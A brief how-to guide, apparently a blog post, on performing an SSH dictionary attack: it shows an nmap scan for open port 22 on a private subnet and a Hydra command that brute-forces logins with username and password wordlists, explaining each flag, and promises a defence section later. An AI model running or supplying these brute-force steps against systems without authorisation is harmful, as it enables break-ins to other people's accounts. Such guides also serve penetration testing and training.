This guide will show you how to perform an ssh dictionary attack

1) Scan for nodes with the ssh protocol open
ex: nmap -p 22 -open -sV 192.168.2.0/24
-p specifies the port number
-open checks for open port
-sV attempts to display ssh version

2)Attack the user using Hydra
ex: hydra -V -L userList.txt -P passwordList.txt -t 16 192.168.2.10 ssh
-V specifies verbose (shows username and password being attempted)
-L user word list. use -l for username
-P password list
-t Threads. upto 32


How to prevent from such attack will be comming soon for firewalld and iptables
